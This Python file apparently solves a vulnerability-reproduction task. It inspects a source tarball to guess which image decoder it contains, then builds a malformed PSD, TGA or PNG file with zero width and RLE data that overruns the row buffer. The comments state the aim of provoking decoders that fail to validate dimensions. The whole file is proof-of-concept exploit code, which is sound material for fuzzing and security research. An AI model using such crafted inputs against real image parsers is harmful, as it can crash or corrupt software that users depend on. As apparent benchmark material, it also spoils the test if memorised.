import tarfile
import io
import struct
import zlib
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Inspect the tarball to identify likely supported formats
        features = {
            'stb': 0,
            'psd': 0,
            'tga': 0,
            'png': 0,
            'tiff': 0,
            'webp': 0,
            'bmp': 0,
        }

        def bump(feature: str, weight: int = 1):
            if feature in features:
                features[feature] += weight

        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    name = m.name.lower()
                    # Heuristic based on filenames
                    if 'stb_image' in name:
                        bump('stb', 5)
                    if 'psd' in name:
                        bump('psd', 3)
                    if 'tga' in name or 'targa' in name:
                        bump('tga', 3)
                    if 'png' in name:
                        bump('png', 2)
                    if 'tiff' in name or 'libtiff' in name or 'tif' in name:
                        bump('tiff', 2)
                    if 'webp' in name:
                        bump('webp', 2)
                    if 'bmp' in name:
                        bump('bmp', 1)

                    # Sample content for additional hints
                    if not m.isfile():
                        continue
                    if m.size > 1024 * 1024:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    try:
                        data = f.read(64 * 1024)
                    finally:
                        f.close()
                    try:
                        text = data.decode('latin-1', errors='ignore').lower()
                    except Exception:
                        text = ''
                    if '8bps' in text or 'photoshop' in text or 'psd' in text:
                        bump('psd', 5)
                    if 'truevision targa' in text or 'tga' in text:
                        bump('tga', 4)
                    if 'png' in text or 'ihdr' in text:
                        bump('png', 3)
                    if 'stb_image' in text:
                        bump('stb', 5)
                    if 'webp' in text:
                        bump('webp', 3)
                    if 'tiff' in text or 'packbits' in text:
                        bump('tiff', 3)
                    if 'bitmap' in text and 'bmp' in text:
                        bump('bmp', 2)
        except Exception:
            # If any error reading the tarball, fall back to a generic choice
            pass

        # Choose format based on heuristics
        # Priority: PSD if code mentions PSD or stb_image (often supports PSD and has had such bugs)
        # Else TGA (also commonly mishandled with RLE + zero width)
        # Else PNG as the broad fallback
        if features['psd'] > 0 or features['stb'] > 0:
            return self._build_psd_zero_width()
        elif features['tga'] > 0:
            # TGA might not always trigger without pixel_count>0; PSD is generally better for zero-width RLE,
            # but if only TGA detected, attempt TGA anyway.
            return self._build_tga_zero_width()
        else:
            return self._build_png_zero_width()

    def _build_psd_zero_width(self) -> bytes:
        # Build a minimal PSD (Photoshop) file with zero width and RLE-compressed rows that expand
        # to nonzero length, provoking decoders that don't validate zero dimensions.
        def be16(x):
            return struct.pack('>H', x)

        def be32(x):
            return struct.pack('>I', x)

        signature = b'8BPS'      # PSD signature
        version = be16(1)        # Version 1
        reserved = b'\x00' * 6
        channels = be16(3)       # RGB channels
        height = be32(1)         # 1 row
        width = be32(0)          # 0 columns (trigger)
        depth = be16(8)          # 8 bits per channel
        color_mode = be16(3)     # RGB color

        header = signature + version + reserved + channels + height + width + depth + color_mode

        # Empty sections
        color_mode_data_len = b'\x00\x00\x00\x00'
        image_resources_len = b'\x00\x00\x00\x00'
        layer_and_mask_len = b'\x00\x00\x00\x00'

        # Image data
        compression = be16(1)  # 1 = RLE (PackBits)

        # One scanline per channel; height=1, channels=3 -> 3 scanlines total
        # Construct a PackBits sequence that expands to 128 bytes for each scanline:
        # 0x7F indicates 127 literal count -> next 128 bytes are literal data.
        scanline_data = bytes([0x7F]) + b'\x00' * 128
        scanline_len = len(scanline_data)  # 129
        counts = be16(scanline_len) * (3 * 1)  # per-row byte counts for each channel/row

        image_data = compression + counts + (scanline_data * 3)

        psd_bytes = header + color_mode_data_len + image_resources_len + layer_and_mask_len + image_data
        return psd_bytes

    def _build_tga_zero_width(self) -> bytes:
        # Build a TGA with zero width and RLE that expands to at least one pixel
        # Header fields:
        # ID length: 0
        # Color map type: 0
        # Image type: 10 (RLE truecolor)
        # Color map spec: 5 bytes zeros
        # X-origin: 0, Y-origin: 0
        # Width: 0, Height: 1
        # Pixel depth: 24 (3 bytes per pixel)
        # Image descriptor: 0
        header = bytearray(18)
        header[0] = 0  # ID length
        header[1] = 0  # no color map
        header[2] = 10  # RLE truecolor
        # color map spec (5 bytes): already zero
        # x-origin y-origin
        # width (2 bytes little endian)
        header[12:14] = struct.pack('<H', 0)
        # height
        header[14:16] = struct.pack('<H', 1)
        header[16] = 24  # bpp
        header[17] = 0   # descriptor

        # RLE packet: run-length packet for 1 pixel (count byte 0x80 indicates 1 run pixel)
        # pixel value: 3 bytes (BGR)
        rle_packet = bytes([0x80, 0x00, 0x00, 0x00])
        return bytes(header) + rle_packet

    def _build_png_zero_width(self) -> bytes:
        # Build a minimal PNG with width=0 height=1 and one row with Sub filter
        def png_chunk(typ: bytes, data: bytes) -> bytes:
            length = struct.pack('>I', len(data))
            crc = struct.pack('>I', zlib.crc32(typ + data) & 0xffffffff)
            return length + typ + data + crc

        sig = b'\x89PNG\r\n\x1a\n'
        width = 0
        height = 1
        bit_depth = 8
        color_type = 2  # truecolor
        compression = 0
        filter_method = 0
        interlace = 0
        ihdr = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, compression, filter_method, interlace)
        ihdr_chunk = png_chunk(b'IHDR', ihdr)

        # One scanline: filter type 1 (Sub) only; no pixel bytes since width=0
        compressed = zlib.compress(b'\x01')
        idat_chunk = png_chunk(b'IDAT', compressed)
        iend_chunk = png_chunk(b'IEND', b'')
        return sig + ihdr_chunk + idat_chunk + iend_chunk